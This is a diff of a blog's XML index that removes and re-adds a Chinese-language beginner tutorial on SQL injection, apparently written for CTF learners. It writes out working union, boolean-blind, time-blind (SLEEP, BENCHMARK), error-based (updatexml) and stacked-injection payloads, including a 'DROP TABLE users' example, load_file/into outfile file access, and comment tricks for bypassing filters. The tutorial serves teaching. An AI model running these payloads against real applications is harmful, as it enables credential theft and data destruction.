-<li>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br><span class="line"># or</span><br><span class="line">1 union SELECT schema_name,2 FROM information_schema.schemata;</span><br><span class="line"># 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。</span><br><span class="line"># 此时后台执行为:</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;</span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261957162.png" alt="image-20230426195745130"></p>
-<p> 也可以把1换成其他的，比如<code>database()</code> 这样我们可以知道我们当前在哪个数据库</p>
-<p> <img src="https://nssctf.wdf.ink//img/WDTJ/202304261959665.png" alt="image-20230426195952638"></p>
-<ul>
-<li>下面就是用联合查询得到数据库里面的表名，一般步骤我们都是先获取当前库 ( <code>database()</code> ) 的表，再去看其他库的。</li>
-</ul>
-<p>这里我们基于<code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br><span class="line"># 原理同上</span><br><span class="line"># 如果要查询其他数据库 可以写为 where table_schema=&#x27;databaseNAME&#x27;</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262013324.png" alt="image-20230426201306290"></p>
-<ul>
-<li>下面就是去获得 表 的对应字段名 方便我们最后一步的查询工作</li>
-</ul>
-<p>这里我们使用<code>UNION</code> <code>GROUP_CONCAT(column_name)</code> 和 <code>information_schema.columns</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()</span><br><span class="line"># 后台执行为：</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262026058.png" alt="image-20230426202627021"></p>
-<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>下面我们假设一个登录系统，那么他会接收两个参数 用户名和密码 后台的查询语句可能这样写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>对于这种，开发时，预期数据收到的参数都为字符，使用字符进行查询的数据库的注入漏洞 我们称为字符型注入。</p>
-<p>与数字型不同的是，我们需要先构造单引号的闭合。</p>
-<p>这里我们让 <code>$username</code>&#x3D; <code>-1&#39; or &#39;1&#39;=&#39;1&#39; --</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; -- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262032468.png" alt="image-20230426203250434"></p>
-<p>就可以使<code>Where</code>的条件永真,直接输出<code>SELECT * FROM users</code>的所有内容。</p>
-<p>同样，与数字型的注入方式类似，我们也可以使用联合查询的方法来获取数据库信息。</p>
-<p><code>order by</code>判断列数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 1-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 2-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 3-- &#x27; AND password=&#x27;$password&#x27;;</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; order by 4-- &#x27; AND password=&#x27;$password&#x27;; # 报错</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304262132275.png" alt="image-20230426213252233"></p>
-<p>那么接下来就和数字型注入相同 吧 <code>order by NUM</code> 换成对应的语句即可：</p>
-<ul>
-<li>库名</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union SELECT 1,schema_name,2 FROM information_schema.schemata;-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>表名</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>- 字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- &#x27; AND password=&#x27;$password&#x27;;</span><br></pre></td></tr></table></figure>
-
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
-<p>我们还是以下面的句子为例子，不过相比于之前的不同，我们规定用户的查询没有回显，所以仅靠上面的方式我们无法获得数据，所以我们选用盲注。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
-
-<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>对于上述语句，如果id的传参如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND 1=1</span><br></pre></td></tr></table></figure>
-
-<p>那么语句执行为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND 1=1;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041911785.png" alt="image-20230504191135714"></p>
-<p>这里会要求两个条件为真，一是有<code>id=1</code>这个值，二是 <code>1=1</code>，这两个条件当然是满足的，特别是后面的这个条件。</p>
-<p>那如果我让AND后面的条件为 <code>1 = 2</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND &#x27;1&#x27;=&#x27;2&#x27;;</span><br><span class="line"># 这里 &#x27;1&#x27; = &#x27;2&#x27;，1 = 2 效果都是一样的</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041915652.png" alt="image-20230504191548610"></p>
-<p>可以看到返回为空，因为AND后面的条件不满足。</p>
-<p>那么利用这个AND符号我们可以尝试下面的一些方式来获取信息：</p>
-<ul>
-<li>使用 length(）获取长度信息</li>
-</ul>
-<p>比如，我们用 length(）函数去爆破数据长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)= NUM</span><br></pre></td></tr></table></figure>
-
-<p>那么语句执行为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND length(username)=1;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305041921180.png" alt="image-20230504192130407"></p>
-<p>当然 枚举长度的方式效率属实难蚌，我们可以使用大于小于符号 基于二分算法进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 AND length(username)&lt; NUM</span><br><span class="line">id = 1 AND length(username)&gt; NUM</span><br></pre></td></tr></table></figure>
-
-<p>这样效率会高很多。</p>
-<ul>
-<li><code>SUBSTR()</code>函数用于截取字符串中的一部分。利用<code>SUBSTR()</code>函数，逐步截取数据库中的某个数据：</li>
-</ul>
-<p><code>SUBSTR(string, start, length)</code> 其中，<code>string</code>表示要截取的字符串，<code>start</code>表示截取的起始位置，<code>length</code>表示截取的长度。<code>SUBSTR()</code>函数会从字符串的<code>start</code>位置开始，截取指定长度的字符。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 AND SUBSTR(username,1,1) = &#x27;?&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>那么语句执行为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = &#x27;?&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042115906.png" alt="image-20230504211550827"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,2,1) = &#x27;d&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042121944.png" alt="image-20230504212127894"></p>
-<p>通过前部分长度的获取，结合 <code>substr()</code> 就可以对一个具体的字符数据进行fuzz了。</p>
-<p>这里推荐编写脚本来完成这样繁琐的工作。</p>
-<p>除了上述用法 <code>SUBSTR()</code>函数还可以用于替换字符串中的某个字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET username=SUBSTR(username,1,3)||&#x27;***&#x27;||SUBSTR(username,7) WHERE username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>面的SQL语句的作用是将管理员账户的用户名中的第4到第6个字符替换为<code>***</code></p>
-<p>通过对该函数的组合使用，可以在不使用联合注入和依赖可视回显的方式拿到对应数据：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND SUBSTR((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>MID()</code>函数也是用于截取字符串的函数。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MID(string, start, length)</span><br><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>CONCAT()</code></li>
-</ul>
-<p><code>CONCAT()</code>函数用于将多个字符串连接成一个字符串。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305042218959.png" alt="image-20230504221859903"></p>
-<p>而在盲注中，我们通常用其的连接功能减少查询跳转。</p>
-<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>其实和布尔差不多，只不过是利用SQL语句的执行时间来判断SQL语句的真假，从而逐步推断出数据库中的数据。</p>
-<p>下面是一些常用函数 和使用技巧：</p>
-<ul>
-<li><code>IF()</code></li>
-</ul>
-<p><code>IF()</code>函数是一种条件判断函数，它用于判断指定条件是否成立，并根据判断结果返回不同的值.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(condition, value_if_true, value_if_false)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>condition</code>表示要判断的条件，<code>value_if_true</code>表示条件成立时要返回的值，<code>value_if_false</code>表示条件不成立时要返回的值。如果条件成立，<code>IF()</code>函数将返回<code>value_if_true</code>，否则将返回<code>value_if_false</code></p>
-<ul>
-<li><code>SLEEP()</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLEEP()` 函数是时间盲注的核心，其语法为 `SLEEP(seconds)</span><br></pre></td></tr></table></figure>
-
-<p>当语句被执行时，程序将会暂停指定秒数，比如下面的例子：</p>
-<p>通常 <code>IF</code> 和 <code>SLEEP</code> 两函数会一起使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(SLEEP(5),1,0)</span><br></pre></td></tr></table></figure>
-
-<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回结束；否则，程序将会暂停5秒钟后再返回结果。</p>
-<p>同样我们使用我们的demo语句，<code>SELECT username,password FROM users WHERE id =</code>来演示：</p>
-<ul>
-<li>利用延时函数，如<code>SLEEP()</code>函数或者<code>BENCHMARK()</code>函数，来判断是否注入成功。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
-
-<p>如果用户表中的第一个用户名字符为字母<code>a</code>，则程序会暂停5秒钟，否则返回0。</p>
-<ul>
-<li>利用时间戳</li>
-</ul>
-<p>可以利用数据库中的时间戳函数，如<code>UNIX_TIMESTAMP()</code>函数来构造延时语句，如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()&gt;1620264296,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
-
-<p>上述SQL语句的意思是：如果当前时间戳大于<code>1620264296</code>，则程序会暂停5秒钟，否则返回0。</p>
-<ul>
-<li>利用函数返回值</li>
-</ul>
-<p>可以利用函数的返回值，如<code>LENGTH()</code>函数、<code>SUBSTR()</code>函数等，来判断是否注入成功。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 AND IF(LENGTH(username)=4,SLEEP(5),0)</span><br></pre></td></tr></table></figure>
-
-<p>上述SQL语句的意思是：如果用户名的长度为4，则程序会暂停5秒钟，否则返回0。</p>
-<ul>
-<li><code>BENCHMARK()</code></li>
-</ul>
-<p><code>BENCHMARK()</code>函数是一种用于重复执行指定语句的函数，在MySQL等数据库中支持使用。<code>BENCHMARK()</code>函数的语法通常如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>count</code>表示要重复执行的次数，<code>expr</code>表示要重复执行的语句。</p>
-<p>看这个例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(BENCHMARK(10,MD5(&#x27;test&#x27;)),1,0)</span><br></pre></td></tr></table></figure>
-
-<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回；否则，程序将会重复执行<code>MD5(&#39;test&#39;)</code>函数10次后再返回结果</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>顾名思义，通过报错信息获取数据的方法。</p>
-<ul>
-<li><code>updatexml()</code></li>
-</ul>
-<p>这里我们先讲 <code>updatexml()</code> 报错注入。</p>
-<p><code>updatexml()</code> 是MySQL中的一种XML处理函数，它用于更新XML格式的数 据，其标准的用法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATEXML(xml_target, xpath_expr, new_value)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>xml_target</code>是要更新的XML数据，<code>xpath_expr</code>是要更新的节点路 径，<code>new_value</code>是新的节点值。</p>
-<p>但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二 个参数的内容显示在报错信息中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and    updatexml(1, 0x7e, 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>那么通过这个特性，我们用 <code>concat()</code> 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) </span><br></pre></td></tr></table></figure>
-
-<p>输出:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and  updatexml(1, concat(0x7e,version()), 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~8.0.12&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>不过要注意的是 <code>updatexml()</code> 的报错长度存在字符长度限制，目前有两 种方法来解决这个问题：</p>
-<ul>
-<li><code>LIMIT()</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and   updatexml(1,concat(0x7e,</span><br><span class="line">(select username from users </span><br><span class="line">limit 1,1)),</span><br><span class="line">3);</span><br><span class="line"># 不断改变limit NUM,1 的值逐行获取</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050110708.png" alt="image-20230505011056626"></p>
-<ul>
-<li><p><code>substr()</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),</span><br><span class="line">1,31)</span><br><span class="line">),3);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>执行结果：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),1,31)</span><br><span class="line">),3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~admin,super,flag,null&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>利用利用上述特性，我们可以下面的语句获取信息：</p>
-<p>获取所有数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(schema_name)</span><br><span class="line">                from information_schema.schemata)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
-
-<p>获取所有表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(table_name)</span><br><span class="line">                from information_schema.tables</span><br><span class="line">                where table_schema = &#x27;security&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
-
-<p>获取所有字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(column_name)</span><br><span class="line">                from information_schema.columns</span><br><span class="line">                where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>extractvalue()</code></li>
-</ul>
-<p><code>extractvalue()</code>是MySQL中的一个XML处理函数，它用于从XML格式的数据中提取指定节点的值。</p>
-<p>正常情况下他的语法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTRACTVALUE(xml_target, xpath_expr)</span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>xml_target</code>是要提取节点值的XML数据，<code>xpath_expr</code>是要提取的节点路径。</p>
-<p>它用于报错注入的方法其实和 <code>updatexml()</code> 函数的使用方法差不多 但是参数少一个x</p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050150790.png" alt="image-20230505015028726"></p>
-<p>而且报错信息长度限制也和<code>updatexml()</code> 一样，所以这里就不多做赘述。</p>
-<ul>
-<li><code>floor()</code></li>
-<li><code>exp()</code></li>
-</ul>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>顾名思义x 一堆 SQL语句(多条)一起执行方法被称为堆叠注入。</p>
-<p>其实讲原理就很容易懂：</p>
-<p>在执行SQL语句时，如果SQL语句中包含多个SQL语句，数据库服务器会依次执行这些SQL语句，从而导致多次SQL注入攻击。通过在SQL语句中使用分号（;）来分隔多个SQL语句，从而实现堆叠注入攻击。</p>
-<p>举个栗子：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>
-
-<p>执行这个SQL语句时，数据库服务器会依次执行这两个SQL语句，将会查询到<code>users</code>表中的用户名和密码，并且将<code>users</code>表删除。</p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2642,6 +2314,336 @@
 ]]></content>
       <tags>
         <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入</title>
+    <url>/2023/08/04/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h2><span id="more"></span>
+
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>就不说奇奇怪怪书面语言了，大致意思就是通过可控输入点达到非预期执行数据库语句，这里的非预期指的是，拼接相应的语句可以拿到数据库里面的其他数据，具体看下面的Demo。</p>
+<p>比如下面的语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>对于他的预期操作，一般一个id是用来索引的,传入的值应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] = 1;</span><br><span class="line">$_GET[&quot;id&quot;] = 2;</span><br></pre></td></tr></table></figure>
+
+<p>所以预期执行的语句应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  1&quot;;</span><br><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  2&quot;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>在没有过滤的情况下，我们能够在后面拼接我们自己的语句</p>
+<p>比如，我们传入的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] =&quot;1 union select username,password from user&quot;</span><br></pre></td></tr></table></figure>
+
+<p>那么最后执行的语句就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = 1 union select username,password from user;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261635588.png" alt="image-20230426163533547"></p>
+<p>这样就造成了非预期语句的执行，我们在获得 <code>users</code> 表中的预期数据的同时也获得了 <code>users</code> 表中的非预期数据。</p>
+<p>当你看到这时，不需要对语句有具体了解，但你需要知道SQL注入是一个怎么样的过程。</p>
+<p>下面我们从数据库基础——结构 基本语法开始 一步一步引到您学会基础的SQL注入。</p>
+<h3 id="SQL数据库基础"><a href="#SQL数据库基础" class="headerlink" title="SQL数据库基础"></a>SQL数据库基础</h3><h4 id="数据库结构基础"><a href="#数据库结构基础" class="headerlink" title="数据库结构基础"></a>数据库结构基础</h4><p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261646646.png" alt="image-20230426164654561"></p>
+<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261652391.png" alt="image-20230426165200366"></p>
+<p>如图所示 数据库 为层级结构：</p>
+<ul>
+<li>数据库 ( database )</li>
+<li>表 ( table )<ul>
+<li>列 (column)</li>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+<h4 id="数据库语法基础¶"><a href="#数据库语法基础¶" class="headerlink" title="数据库语法基础¶"></a>数据库语法基础<a href="https://ctf.tj.cn/ctf_web/sql_injection/#_3">¶</a></h4><p>常用语法：</p>
+<ul>
+<li><code>SELECT</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>UNION</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">UNION</span><br><span class="line">SELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>
+
+<p> 注意 使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
+<ul>
+<li><code>LIMIT</code></li>
+<li><code>SQL SELECT column1, column2, ... FROM table_name LIMIT number; #返回表中前number行数据 SELECT column1, column2, ... FROM table_name LIMIT offset, row_count; #从offset+1行开始返回row_count行数据 #比如 LIMIT 10, 10 返回11-20行数据</code></li>
+<li><code>SQL SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</code></li>
+<li><code>注释</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br><span class="line">  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格</span><br><span class="line">  #/*中间的内容都将被注释*/</span><br><span class="line">  SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Order by</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br><span class="line"># 其中，column1、column2等表示要查询的列名，table_name表示要查询的表名，condition表示查询条件，column_name表示要按照哪一列进行排序，ASC或DESC表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</span><br><span class="line"># 在SQL注入中我们常用它来判断列数</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>
+
+<p>常用参数：</p>
+<ul>
+<li><code>user()</code>：当前数据库用户</li>
+<li><code>database()</code>：当前数据库名</li>
+<li><code>version()</code>：当前使用的数据库版本</li>
+<li><code>@@datadir</code>：数据库存储数据路径</li>
+<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
+<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
+<li><code>concat_ws()</code>：用法类似</li>
+<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
+<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
+<li><code>CHAR()</code>：把整数转换为对应的字符</li>
+<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
+<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
+</ul>
+<h3 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>我们开局举的例子就是一个很典型的数字型注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
+
+<p>我们可用理解为两个部分 原有语句 <code>SELECT username,password FROM users WHERE id =</code>和用户输入部分<code>$_GET[&quot;id&quot;]</code>。</p>
+<p>前面我们说到，这种语句一般用于用户输入id来索引查询，所以预期的输入都是数字，所以直接采用的直接拼接的方式，以数字的方式进行查询。</p>
